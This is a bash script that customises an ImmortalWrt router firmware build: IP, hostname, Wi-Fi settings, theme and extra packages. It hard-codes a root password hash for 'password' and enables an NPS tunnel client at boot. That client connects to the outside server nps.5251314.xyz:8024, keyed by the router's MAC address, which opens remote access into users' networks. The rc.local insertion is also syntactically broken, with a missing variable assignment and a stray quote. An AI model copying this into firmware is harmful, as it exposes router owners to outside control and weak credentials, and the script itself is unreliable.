#!/bin/bash

#修改默认主题
#sed -i "s/luci-theme-bootstrap/luci-theme-$WRT_THEME/g" $(find ./feeds/luci/collections/ -type f -name "Makefile")
#修改immortalwrt.lan关联IP
sed -i "s/192\.168\.[0-9]*\.[0-9]*/$WRT_IP/g" $(find ./feeds/luci/modules/luci-mod-system/ -type f -name "flash.js")
#添加编译日期标识
sed -i "s/(\(luciversion || ''\))/(\1) + (' \/ $WRT_MARK-$WRT_DATE')/g" $(find ./feeds/luci/modules/luci-mod-status/ -type f -name "10_system.js")

# Add the default password for the 'root' user（Change the empty password to 'password'）
sed -i 's/root:::0:99999:7:::/root:$1$V4UetPzk$CYXluq4wUazHjmCDBCqXF.::0:99999:7:::/g' package/base-files/files/etc/shadow

WIFI_FILE="./package/mtk/applications/mtwifi-cfg/files/mtwifi.sh"
#修改WIFI名称
sed -i "s/ImmortalWrt/$WRT_SSID/g" $WIFI_FILE
#修改WIFI加密
sed -i "s/encryption=.*/encryption='psk2+ccmp'/g" $WIFI_FILE
#修改WIFI密码
sed -i "/set wireless.default_\${dev}.encryption='psk2+ccmp'/a \\\t\t\t\t\t\set wireless.default_\${dev}.key='$WRT_WORD'" $WIFI_FILE

CFG_FILE="./package/base-files/files/bin/config_generate"
#修改默认IP地址
sed -i "s/192\.168\.[0-9]*\.[0-9]*/$WRT_IP/g" $CFG_FILE
#修改默认主机名
sed -i "s/hostname='.*'/hostname='$WRT_NAME'/g" $CFG_FILE

#配置文件修改
echo "CONFIG_PACKAGE_luci=y" >> ./.config
echo "CONFIG_LUCI_LANG_zh_Hans=y" >> ./.config
echo "CONFIG_PACKAGE_luci-theme-$WRT_THEME=y" >> ./.config
echo "CONFIG_PACKAGE_luci-app-$WRT_THEME-config=y" >> ./.config

#手动调整的插件
if [ -n "$WRT_PACKAGE" ]; then
	echo -e "$WRT_PACKAGE" >> ./.config
fi


#添加Kwrt软件源
git clone --depth 1 https://github.com/destan19/OpenAppFilter.git  package/oaf
git clone --depth 1 https://github.com/kiddin9/kwrt-packages.git package/kwrt-packages
mv package/kwrt-packages/luci-app-pushbot package/luci-app-pushbot
rm -rf package/kwrt-packages

# 在 Settings.sh 末尾添加以下内容自动写入 /etc/rc.local
if [ ! -f /etc/npc-init.flag ]; then
    WAN_IF=$(uci get network.wan.ifname 2>/dev/null || echo "wan")
    WAN_MAC=$(cat /sys/class/net/$WAN_IF/address 2>/dev/null || echo "00:00:00:00:00:00")
    VKEY=${WAN_MAC}

    uci set npc.@npc[0].server_addr="nps.5251314.xyz"
    uci set npc.@npc[0].vkey="$VKEY"
    uci set npc.@npc[0].compress="1"
    uci set npc.@npc[0].crypt="1"
    uci set npc.@npc[0].enable="1"
    uci set npc.@npc[0].server_port="8024"
    uci set npc.@npc[0].protocol="tcp"
    uci commit npc
	sed -i 's|conf_Path="/tmp/etc/npc.conf"|conf_Path="/etc/npc.conf"|g' /etc/init.d/npc
	# 使用 sed 插入内容
	touch /etc/npc.conf
	sed -i "1i[common]" /etc/npc.conf && \
	sed -i "2iserver_addr=nps.5251314.xyz:8024" /etc/npc.conf && \
	sed -i "3iconn_type=tcp" /etc/npc.conf && \
	sed -i "4ivkey=${VKEY}" /etc/npc.conf && \
	sed -i "5iauto_reconnection=true" /etc/npc.conf && \
	sed -i "6icompress=true" /etc/npc.conf && \
	sed -i "7icrypt=true" /etc/npc.conf

    touch /etc/npc-init.flag
    /etc/init.d/npc enable   # 设置开机自启
    /etc/init.d/npc restart
fi
'

RCLOCAL="package/base-files/files/etc/rc.local"

# 只有没有插入过才插入（通过唯一标识判断）
if ! grep -q 'npc-init.flag' "$RCLOCAL"; then
    # 用awk插入到exit 0前
    awk -v insert="$insert_content" '
    /^exit 0/ {
        print insert
    }
    { print }
    ' "$RCLOCAL" > "$RCLOCAL.tmp" && mv "$RCLOCAL.tmp" "$RCLOCAL"
    chmod +x "$RCLOCAL"
fi


#调整mtk系列配置
sed -i '/TARGET.*mediatek/d' ./.config
sed -i '/TARGET_MULTI_PROFILE/d' ./.config
sed -i '/TARGET_PER_DEVICE_ROOTFS/d' ./.config
sed -i '/luci-app-eqos/d' ./.config
sed -i '/luci-app-mtk/d' ./.config
sed -i '/luci-app-upnp/d' ./.config
sed -i '/luci-app-wol/d' ./.config
sed -i '/wifi-profile/d' ./.config
